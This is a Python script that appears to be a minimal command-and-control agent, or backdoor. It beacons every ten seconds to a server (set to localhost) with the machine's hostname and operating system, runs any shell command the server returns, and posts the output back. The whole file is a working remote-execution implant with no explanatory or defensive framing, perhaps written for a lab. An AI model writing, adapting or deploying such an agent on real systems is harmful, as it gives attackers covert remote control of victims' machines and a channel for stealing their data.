import requests
import time
import subprocess
import socket
import uuid
import platform

SERVER_URL = "http://localhost:5001"
AGENT_ID = f"simple_{str(uuid.uuid4())[:4]}"

def execute_cmd(cmd):
    try:
        res = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return res.stdout + res.stderr
    except Exception as e:
        return str(e)

def run():
    print(f"[*] Simple Agent {AGENT_ID} started.")
    while True:
        try:
            resp = requests.post(f"{SERVER_URL}/beacon", json={
                "agent_id": AGENT_ID,
                "hostname": socket.gethostname(),
                "os": platform.system()
            }, timeout=10)
            
            if resp.status_code == 200:
                data = resp.json()
                if "command" in data:
                    print(f"[*] Executing: {data['command']}")
                    output = execute_cmd(data["command"])
                    requests.post(f"{SERVER_URL}/result", json={
                        "agent_id": AGENT_ID,
                        "command_id": data["command_id"],
                        "output": output
                    }, timeout=10)
            
        except Exception as e:
            print(f"[!] Error: {e}")
        
        time.sleep(10)

if __name__ == "__main__":
    run()
